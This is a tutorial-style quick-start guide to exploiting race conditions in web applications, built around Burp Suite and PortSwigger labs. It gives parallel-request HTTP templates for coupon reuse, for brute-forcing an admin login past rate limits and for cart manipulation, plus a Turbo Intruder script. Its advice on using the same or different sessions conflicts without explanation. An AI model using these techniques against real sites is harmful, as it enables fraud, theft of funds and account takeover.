# Race Conditions - Quick Start Guide

## What are Race Conditions?

Race conditions occur when multiple requests access shared resources simultaneously without proper synchronization, creating exploitable timing windows between validation and action.

**The Problem:**
```
1. Check: Is resource available?
2. [RACE WINDOW] ← Multiple requests pass here
3. Use: Consume resource
4. Update: Mark as used
```

## 5-Minute Quick Test

### Step 1: Identify Target (1 minute)

Look for operations that:
- Apply discounts/coupons
- Enforce rate limits
- Consume single-use items
- Check balances/quotas
- Process file uploads

### Step 2: Baseline Test (1 minute)

Send request **twice sequentially**:
```
Request 1: Success ✓
Request 2: Error (already used) ✓
```

### Step 3: Race Test (2 minutes)

Send **20 requests in parallel**:

**Burp Repeater:**
1. Send request to Repeater
2. Right-click tab → "Add to new tab group"
3. Duplicate 19 times (Ctrl+Shift+D)
4. Right-click group → "Send group in parallel (single-packet attack)"

### Step 4: Analyze (1 minute)

**Look for anomalies:**
- Multiple successes (expected: 1)
- Different status codes
- Different response lengths
- Different error messages

**Vulnerable if:**
```
Sequential: 200, 409, 409, 409
Parallel:   200, 200, 200, 409  ← Multiple 200s!
```

## Common Attack Scenarios

### 1. Discount Code Reuse

**Request:**
```http
POST /cart/coupon HTTP/2
Host: target.com
Cookie: session=TOKEN

coupon=PROMO20
```

**Attack:** Send 20 times in parallel
**Impact:** Multiple discounts applied

### 2. Rate Limit Bypass

**Request:**
```http
POST /login HTTP/2
Host: target.com

username=admin&password=%s
```

**Attack:** 100 parallel requests with password list
**Impact:** Brute-force despite rate limiting

### 3. Cart Manipulation

**Requests:**
```http
# Request 1: Checkout
POST /cart/checkout HTTP/2
Host: target.com

# Request 2: Add expensive item
POST /cart HTTP/2
Host: target.com

productId=expensive_item
```

**Attack:** Send both in parallel
**Impact:** Purchase item at wrong price

## Burp Suite Quick Setup

### Option 1: Repeater (Easy)

```
1. Capture request in Proxy
2. Send to Repeater
3. Create tab group
4. Duplicate 19 times
5. Send group in parallel
```

### Option 2: Turbo Intruder (Advanced)

```
1. Install from BApp Store
2. Right-click request → Extensions → Turbo Intruder
3. Use template: race-single-packet-attack.py
4. Launch attack
```

**Basic Script:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    for i in range(20):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

## Detection Phases (PREDICT → PROBE → PROVE)

### Phase 1: PREDICT

**Ask:**
- Does it check a condition?
- Is there a gap before action?
- Does it enforce a limit?
- Is it a single-use resource?

### Phase 2: PROBE

**Test:**
1. Sequential requests (baseline)
2. Parallel requests (attack)
3. Compare results

**Look for:**
- Different behaviors
- Multiple successes
- Timing patterns

### Phase 3: PROVE

**Confirm:**
1. Isolate minimal requests
2. Test 10+ times
3. Document impact
4. Success rate > 50% = exploitable

## Key Techniques

### HTTP/2 Single-Packet Attack

**Best method for maximum precision:**
- All requests in one TCP packet
- Eliminates network jitter
- Requires Burp 2023.9+

**Configuration:**
```python
engine = RequestEngine(
    concurrentConnections=1,
    engine=Engine.BURP2
)
```

### Session Locking Bypass

**Problem:** PHP locks one request per session

**Solution:** Use different sessions
```http
# Request 1
Cookie: session=SESSION_A

# Request 2
Cookie: session=SESSION_B
```

### Connection Warming

**Problem:** First request slower than subsequent

**Solution:** Send warmup requests first
```http
GET / HTTP/2  (5 times)
# Then execute attack
```

## Common Vulnerabilities

### 1. Limit Overrun

**Vulnerable Code:**
```python
if not is_used(coupon):
    apply(coupon)
    mark_used(coupon)  # Gap!
```

**Exploit:** Multiple requests pass `is_used()` check

### 2. TOCTOU (Time-of-Check to Time-of-Use)

**Vulnerable Code:**
```python
if balance >= amount:  # Check
    # Gap!
    withdraw(amount)   # Use
```

**Exploit:** Multiple withdrawals with same balance

### 3. Partial Construction

**Vulnerable Code:**
```python
user = create_user()  # token is null
# Gap!
user.token = generate_token()
```

**Exploit:** Use user before token assigned

### 4. Timestamp Collision

**Vulnerable Code:**
```python
token = hash(user + timestamp())
```

**Exploit:** Force same timestamp for different users

## Quick Wins Checklist

**Test These First:**
- [ ] Discount/coupon codes
- [ ] Gift card redemption
- [ ] Login rate limiting
- [ ] Password reset tokens
- [ ] Cart checkout flow
- [ ] Email change functions
- [ ] File upload validation
- [ ] Account registration
- [ ] Withdrawal/transfer limits
- [ ] API rate limits

## Success Indicators

### You Found a Race Condition When:

**Multiple Successes:**
```
Expected: 1 success, 19 failures
Actual: 5 successes, 15 failures  ✓
```

**Status Code Anomalies:**
```
Expected: 200, 409, 409, 409
Actual: 200, 200, 200, 409  ✓
```

**Response Length Differences:**
```
Expected: All 3420 bytes
Actual: 3420, 3567, 3567, 3420  ✓
```

**Timing Patterns:**
```
Sequential: 150ms, 160ms, 155ms
Parallel: 145ms, 145ms, 145ms  ✓ (synchronized)
```

## Common Mistakes to Avoid

### ❌ Mistake 1: Sequential Requests

**Wrong:**
```
Send request 1 → Wait → Send request 2
```

**Right:**
```
Queue 20 requests → Send all simultaneously
```

### ❌ Mistake 2: Different Sessions

**Wrong:**
```
Request 1: Cookie: session=ABC
Request 2: Cookie: session=XYZ
```

**Right:**
```
All requests: Cookie: session=ABC
```

### ❌ Mistake 3: Not Enough Requests

**Wrong:**
```
Send 5 requests in parallel
```

**Right:**
```
Send 20-50 requests for narrow race windows
```

### ❌ Mistake 4: Giving Up Too Early

**Wrong:**
```
Try once, doesn't work, move on
```

**Right:**
```
Try 10-20 times (timing dependent)
```

## Troubleshooting

### Problem: No Collision Detected

**Check:**
- Using parallel (not sequential)?
- Same session cookie?
- Valid CSRF tokens?
- HTTP/2 enabled?
- Enough requests (20+)?

**Try:**
- Increase to 50-100 requests
- Add connection warming
- Verify target is vulnerable

### Problem: Inconsistent Results

**Solutions:**
- Add connection warming
- Use HTTP/2 single-packet
- Increase request volume
- Retry multiple times

### Problem: Session Locking

**Solutions:**
- Use different sessions
- Verify not using same cookie
- Check framework documentation

## Real-World Impact Examples

### Example 1: Free Shopping

**Vulnerability:** Coupon code race condition
**Exploit:** Apply discount 20 times
**Impact:** $1337 jacket for $67

### Example 2: Admin Access

**Vulnerability:** Login rate limit bypass
**Exploit:** Brute-force 100 passwords
**Impact:** Compromise admin account

### Example 3: Account Takeover

**Vulnerability:** Email change collision
**Exploit:** Claim admin email
**Impact:** Admin privileges gained

### Example 4: Fund Theft

**Vulnerability:** Balance check race
**Exploit:** Multiple withdrawals
**Impact:** Withdraw more than balance

## Next Steps

### Learning Path:

1. **Start Here:** Test discount codes (easiest)
2. **Intermediate:** Multi-endpoint attacks
3. **Advanced:** Partial construction exploits
4. **Expert:** Custom Turbo Intruder scripts

### Practice Labs:

**PortSwigger Free Labs:**
- Limit overrun race conditions
- Bypassing rate limits via race conditions
- Multi-endpoint race conditions

**PortSwigger Practitioner Labs:**
- Single-endpoint race conditions
- Web shell upload via race condition

**PortSwigger Expert Labs:**
- Partial construction race conditions
- Exploiting time-sensitive vulnerabilities

### Tools to Master:

1. **Burp Repeater** - Basic testing
2. **Turbo Intruder** - Advanced attacks
3. **Python scripts** - Custom automation

## Essential Resources

### Must-Read:
- PortSwigger Race Conditions Tutorial
- "Smashing the State Machine" (Black Hat 2023)
- OWASP Business Logic Abuse (BLA9:2025)

### Tools:
- Burp Suite Professional 2023.9+
- Turbo Intruder extension
- HTTP/2 support enabled

### Practice:
- PortSwigger Web Security Academy
- 7 race condition labs
- Progressive difficulty

## Quick Reference Commands

### Burp Repeater:
```
Create group: Right-click tab → Add to new tab group
Duplicate: Ctrl+Shift+D
Send parallel: Right-click group → Send group in parallel
```

### Turbo Intruder:
```
Launch: Right-click → Extensions → Turbo Intruder
Mark payload: Highlight value → Right-click → Payload position
Template: race-single-packet-attack.py
```

### Analysis:
```
Sort by: Status code, Length, Time
Look for: Multiple successes, anomalies
Compare: Sequential vs parallel behavior
```

## Success Metrics

**You're Ready to Move Forward When:**
- ✓ Can identify race condition candidates
- ✓ Know how to use Burp Repeater for testing
- ✓ Understand PREDICT → PROBE → PROVE methodology
- ✓ Can recognize exploitation indicators
- ✓ Successfully exploited at least 1 lab

## Key Takeaways

1. **Race conditions exploit timing gaps** between validation and action
2. **Send 20+ parallel requests** to hit narrow windows
3. **HTTP/2 single-packet attack** provides best results
4. **Look for multiple successes** when expecting one
5. **Timing is critical** - may require multiple attempts
6. **Start with easy targets** like discount codes
7. **Use Burp 2023.9+** for single-packet support

## Ready to Start?

**Your First Test (5 minutes):**

1. Find a discount code endpoint
2. Apply code once (works)
3. Apply code again (fails)
4. Send 20 parallel requests
5. Check for multiple successes

**If successful:** You found a race condition! 🎉

**If not:** Try rate limiting, file uploads, or cart manipulation

---

**Remember:** Race conditions are timing-dependent. Success may require multiple attempts. Don't give up after the first try!
